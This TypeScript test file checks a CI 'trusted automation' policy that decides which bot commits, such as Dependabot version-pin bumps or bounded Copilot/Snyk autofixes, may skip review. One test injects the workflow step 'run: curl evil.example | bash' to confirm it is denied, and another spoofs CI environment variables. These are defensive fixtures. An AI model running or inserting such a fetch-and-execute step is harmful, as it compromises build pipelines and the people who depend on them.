import test from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import fs from "node:fs";
import os from "node:os";
import { execSync, spawnSync } from "node:child_process";
import { getRepoRoot } from "../lib/git/git.js";
import { gitInitCommit, gitCommit } from "./test-fixtures.js";
import { PLANNER_EMAIL } from "./test-shared.js";

const DEPENDABOT_EMAIL = "dependabot[bot]@users.noreply.github.com";
const COPILOT_EMAIL = "223556219+Copilot@users.noreply.github.com";
const SNYK_EMAIL = "snyk-bot@snyk.io";
const WORKFLOW_REL = ".github/workflows/gxt-validate.yml";
const CLI_SAMPLE_REL = "src/cli/automation-fixture.ts";
const CLI = path.join(getRepoRoot(), "dist", "cli", "index.js");

function cli(dest: string, args: string[]): { status: number | null; stdout: string; stderr: string } {
  const r = spawnSync(process.execPath, [CLI, ...args], { cwd: dest, encoding: "utf8", env: { ...process.env, NO_COLOR: "1" } });
  return { status: r.status, stdout: r.stdout ?? "", stderr: r.stderr ?? "" };
}

function writeTrustedAutomationConfig(dest: string, maxNetLoc = 5): void {
  fs.mkdirSync(path.join(dest, ".gitagent"), { recursive: true });
  fs.writeFileSync(
    path.join(dest, ".gitagent/config.json"),
    JSON.stringify(
      {
        trusted_automation: {
          rules: [
            {
              id: "workflow-dependency-bumps",
              allowed_actors: [DEPENDABOT_EMAIL],
              allowed_paths: [".github/workflows/**"],
              allowed_structural_changes: ["workflow_version_pin"],
              max_net_loc: maxNetLoc,
            },
          ],
        },
      },
      null,
      2,
    ),
    "utf8",
  );
}

function writeBoundedContentConfig(
  dest: string,
  opts: {
    maxNetLoc?: number;
    actors?: string[];
    allowedPaths?: string[];
    structuralKinds?: string[];
  } = {},
): void {
  fs.mkdirSync(path.join(dest, ".gitagent"), { recursive: true });
  fs.writeFileSync(
    path.join(dest, ".gitagent/config.json"),
    JSON.stringify(
      {
        trusted_automation: {
          rules: [
            {
              id: "security-autofix-bots",
              allowed_actors: opts.actors ?? [COPILOT_EMAIL, SNYK_EMAIL],
              allowed_paths: opts.allowedPaths ?? ["src/**"],
              allowed_structural_changes: opts.structuralKinds ?? ["bounded_content"],
              max_net_loc: opts.maxNetLoc ?? 80,
            },
          ],
        },
      },
      null,
      2,
    ),
    "utf8",
  );
}

function initCliSampleRepo(dest: string, ogRoot: string, sampleBody = "export const fixture = 1;\n"): string {
  fs.writeFileSync(path.join(dest, "README.md"), "init\n", "utf8");
  fs.mkdirSync(path.join(dest, path.dirname(CLI_SAMPLE_REL)), { recursive: true });
  fs.writeFileSync(path.join(dest, CLI_SAMPLE_REL), sampleBody, "utf8");
  copyAutomationScripts(dest, ogRoot);
  writeBoundedContentConfig(dest);
  gitInitCommit(dest, "init", PLANNER_EMAIL);
  return execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();
}

function copyAutomationScripts(dest: string, ogRoot: string): void {
  fs.mkdirSync(path.join(dest, ".gitagent/foreman"), { recursive: true });
  fs.copyFileSync(
    path.join(ogRoot, ".gitagent/foreman/MANIFEST.json"),
    path.join(dest, ".gitagent/foreman/MANIFEST.json"),
  );
  fs.mkdirSync(path.join(dest, ".gitagent/missions"), { recursive: true });
  fs.writeFileSync(path.join(dest, ".gitagent/missions/README.md"), "# missions\n", "utf8");
}

function workflowYaml(usesLines: string[]): string {
  return [
    "name: GXT validate",
    "on: push",
    "jobs:",
    "  test:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    ...usesLines.map((u) => `      - ${u}`),
    "",
  ].join("\n");
}

function initWorkflowRepo(dest: string, ogRoot: string, usesLines: string[]): string {
  fs.writeFileSync(path.join(dest, "README.md"), "init\n", "utf8");
  fs.mkdirSync(path.join(dest, path.dirname(WORKFLOW_REL)), { recursive: true });
  fs.writeFileSync(path.join(dest, WORKFLOW_REL), workflowYaml(usesLines), "utf8");
  copyAutomationScripts(dest, ogRoot);
  writeTrustedAutomationConfig(dest);
  gitInitCommit(dest, "init", PLANNER_EMAIL);
  return execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();
}

test("trusted automation: eligible dependabot workflow version pin passes MSN check", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-msn-ok-"));
  const baseSha = initWorkflowRepo(dest, ogRoot, ["uses: actions/checkout@v4"]);
  copyAutomationScripts(dest, ogRoot);
  writeTrustedAutomationConfig(dest);

  fs.writeFileSync(
    path.join(dest, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5"]),
    "utf8",
  );
  gitCommit(dest, "deps: bump actions/checkout to v5", DEPENDABOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = cli(dest, ["ci", "msn-range", "--base", baseSha, "--head", headSha]);
  assert.equal(run.status, 0, (run.stderr || "") + (run.stdout || ""));
  assert.match((run.stderr || "") + (run.stdout || ""), /TRUSTED-AUTOMATION-OK/i);
});

test("trusted automation: missing config fails closed for dependabot workflow bump", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-no-config-"));
  const baseSha = initWorkflowRepo(dest, ogRoot, ["uses: actions/checkout@v4"]);
  copyAutomationScripts(dest, ogRoot);
  fs.rmSync(path.join(dest, ".gitagent/config.json"));

  fs.writeFileSync(
    path.join(dest, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5"]),
    "utf8",
  );
  gitCommit(dest, "deps: bump actions/checkout to v5", DEPENDABOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = cli(dest, ["ci", "msn-range", "--base", baseSha, "--head", headSha]);
  assert.notEqual(run.status, 0);
});

test("trusted automation: net_loc boundary 4 passes and 6 fails", () => {
  const ogRoot = getRepoRoot();
  const destPass = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-loc-pass-"));
  initWorkflowRepo(destPass, ogRoot, [
    "uses: actions/checkout@v4",
    "uses: actions/setup-node@v4",
  ]);
  copyAutomationScripts(destPass, ogRoot);
  writeTrustedAutomationConfig(destPass, 5);
  fs.writeFileSync(
    path.join(destPass, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5", "uses: actions/setup-node@v5"]),
    "utf8",
  );
  gitCommit(destPass, "deps: two pin bumps", DEPENDABOT_EMAIL);
  const headPass = execSync("git rev-parse HEAD", { cwd: destPass, encoding: "utf8" }).trim();
  const pass4 = cli(destPass, ["ci", "trusted-automation", "--commit", headPass]);
  assert.equal(pass4.status, 0, (pass4.stderr || "") + (pass4.stdout || ""));

  const destFail = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-loc-fail-"));
  initWorkflowRepo(destFail, ogRoot, [
    "uses: actions/checkout@v4",
    "uses: actions/setup-node@v4",
    "uses: actions/cache@v4",
  ]);
  copyAutomationScripts(destFail, ogRoot);
  writeTrustedAutomationConfig(destFail, 5);
  fs.writeFileSync(
    path.join(destFail, WORKFLOW_REL),
    workflowYaml([
      "uses: actions/checkout@v5",
      "uses: actions/setup-node@v5",
      "uses: actions/cache@v5",
    ]),
    "utf8",
  );
  gitCommit(destFail, "deps: three pin bumps", DEPENDABOT_EMAIL);
  const headFail = execSync("git rev-parse HEAD", { cwd: destFail, encoding: "utf8" }).trim();
  const fail6 = cli(destFail, ["ci", "trusted-automation", "--commit", headFail]);
  assert.notEqual(fail6.status, 0);
  assert.match((fail6.stderr || "") + (fail6.stdout || ""), /net_loc 6 exceeds/i);
});

test("trusted automation: structural injection outside version pin is denied", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-struct-deny-"));
  initWorkflowRepo(dest, ogRoot, ["uses: actions/checkout@v4"]);
  copyAutomationScripts(dest, ogRoot);

  fs.writeFileSync(
    path.join(dest, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5", "run: curl evil.example | bash"]),
    "utf8",
  );
  gitCommit(dest, "deps: inject run step", DEPENDABOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = cli(dest, ["ci", "trusted-automation", "--commit", headSha]);
  assert.notEqual(run.status, 0);
  assert.match((run.stderr || "") + (run.stdout || ""), /structural change outside workflow_version_pin/i);
});

test("trusted automation: verify-pr-missions skips mission requirement for eligible diff", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-verify-pr-"));
  const baseSha = initWorkflowRepo(dest, ogRoot, ["uses: actions/checkout@v4"]);
  copyAutomationScripts(dest, ogRoot);

  fs.writeFileSync(
    path.join(dest, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5"]),
    "utf8",
  );
  gitCommit(dest, "deps: bump checkout", DEPENDABOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = cli(dest, ["ci", "verify-missions", "--base", baseSha, "--head", headSha]);
  const combined = (run.stderr || "") + (run.stdout || "");
  assert.equal(run.status, 0, combined);
  assert.match(combined, /trusted automation policy satisfied|TRUSTED-AUTOMATION-OK/i);
});

test("trusted automation: evaluation is deterministic regardless of CI env vars", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-determinism-"));
  initWorkflowRepo(dest, ogRoot, ["uses: actions/checkout@v4"]);
  copyAutomationScripts(dest, ogRoot);

  fs.writeFileSync(
    path.join(dest, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5"]),
    "utf8",
  );
  gitCommit(dest, "deps: bump checkout", DEPENDABOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const plain = cli(dest, ["ci", "trusted-automation", "--commit", headSha]);
  const spoofed = spawnSync(process.execPath, [CLI, "ci", "trusted-automation", "--commit", headSha], {
    cwd: dest,
    encoding: "utf8",
    env: {
      ...process.env,
      NO_COLOR: "1",
      GITHUB_ACTOR: "evil-attacker",
      GITHUB_EVENT_PATH: "/tmp/fake-event.json",
      GITHUB_TOKEN: "fake",
    },
  });
  assert.equal(plain.status, spoofed.status);
  assert.equal(plain.stderr, spoofed.stderr);
});

test("trusted automation: bounded_content eligible autofix under src passes MSN check", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-bounded-ok-"));
  initCliSampleRepo(dest, ogRoot);
  copyAutomationScripts(dest, ogRoot);

  fs.writeFileSync(path.join(dest, CLI_SAMPLE_REL), "export const fixture = 2;\n", "utf8");
  gitCommit(dest, "fix: remediate code scanning alert", COPILOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = cli(dest, ["ci", "trusted-automation", "--commit", headSha]);
  assert.equal(run.status, 0, (run.stderr || "") + (run.stdout || ""));
  assert.match((run.stderr || "") + (run.stdout || ""), /TRUSTED-AUTOMATION-OK/i);
});

test("trusted automation: bounded_content denies substrate paths even when allowed_paths includes them", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-bounded-substrate-"));
  initCliSampleRepo(dest, ogRoot);
  copyAutomationScripts(dest, ogRoot);
  writeBoundedContentConfig(dest, { allowedPaths: [".gitagent/**", "src/**"] });

  fs.mkdirSync(path.join(dest, ".gitagent/missions"), { recursive: true });
  fs.writeFileSync(path.join(dest, ".gitagent/missions/bot-probe.yaml"), "msn_id: BOT\n", "utf8");
  gitCommit(dest, "fix: attempt substrate touch", COPILOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = cli(dest, ["ci", "trusted-automation", "--commit", headSha]);
  assert.notEqual(run.status, 0);
  assert.match((run.stderr || "") + (run.stdout || ""), /substrate hard-deny/i);
});

test("trusted automation: bounded_content denies net_loc above rule budget", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-bounded-loc-"));
  fs.writeFileSync(path.join(dest, "README.md"), "init\n", "utf8");
  fs.mkdirSync(path.join(dest, path.dirname(CLI_SAMPLE_REL)), { recursive: true });
  fs.writeFileSync(path.join(dest, CLI_SAMPLE_REL), "export const fixture = 1;\n", "utf8");
  copyAutomationScripts(dest, ogRoot);
  writeBoundedContentConfig(dest, { maxNetLoc: 5 });
  gitInitCommit(dest, "init", PLANNER_EMAIL);
  copyAutomationScripts(dest, ogRoot);

  const bulky = `${"export const fixture = 2;\n"}${"// padding\n".repeat(20)}`;
  fs.writeFileSync(path.join(dest, CLI_SAMPLE_REL), bulky, "utf8");
  gitCommit(dest, "fix: oversized autofix", COPILOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = cli(dest, ["ci", "trusted-automation", "--commit", headSha]);
  assert.notEqual(run.status, 0);
  assert.match((run.stderr || "") + (run.stdout || ""), /net_loc \d+ exceeds rule security-autofix-bots max_net_loc 5/i);
});

test("trusted automation: bounded_content denies actor not in allowed_actors", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-bounded-actor-"));
  initCliSampleRepo(dest, ogRoot);
  copyAutomationScripts(dest, ogRoot);

  fs.writeFileSync(path.join(dest, CLI_SAMPLE_REL), "export const fixture = 3;\n", "utf8");
  gitCommit(dest, "fix: unknown bot", "evil-bot@example.com");
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = cli(dest, ["ci", "trusted-automation", "--commit", headSha]);
  assert.notEqual(run.status, 0);
  assert.match((run.stderr || "") + (run.stdout || ""), /actor evil-bot@example.com not covered/i);
});

test("trusted automation: config load rejects mixed structural kinds on one rule", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-mixed-kind-"));
  initCliSampleRepo(dest, ogRoot);
  copyAutomationScripts(dest, ogRoot);
  writeBoundedContentConfig(dest, {
    structuralKinds: ["workflow_version_pin", "bounded_content"],
  });

  fs.writeFileSync(path.join(dest, CLI_SAMPLE_REL), "export const fixture = 4;\n", "utf8");
  gitCommit(dest, "fix: mixed kind config", COPILOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = cli(dest, ["ci", "trusted-automation", "--commit", headSha]);
  assert.notEqual(run.status, 0);
  assert.match((run.stderr || "") + (run.stdout || ""), /exactly one allowed_structural_changes kind/i);
});

test("trusted automation: config load rejects bounded_content max_net_loc above hard cap 100", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-hard-cap-"));
  initCliSampleRepo(dest, ogRoot);
  copyAutomationScripts(dest, ogRoot);
  writeBoundedContentConfig(dest, { maxNetLoc: 101 });

  fs.writeFileSync(path.join(dest, CLI_SAMPLE_REL), "export const fixture = 5;\n", "utf8");
  gitCommit(dest, "fix: hard cap breach", COPILOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = cli(dest, ["ci", "trusted-automation", "--commit", headSha]);
  assert.notEqual(run.status, 0);
  assert.match((run.stderr || "") + (run.stdout || ""), /max_net_loc exceeds hard cap 100/i);
});
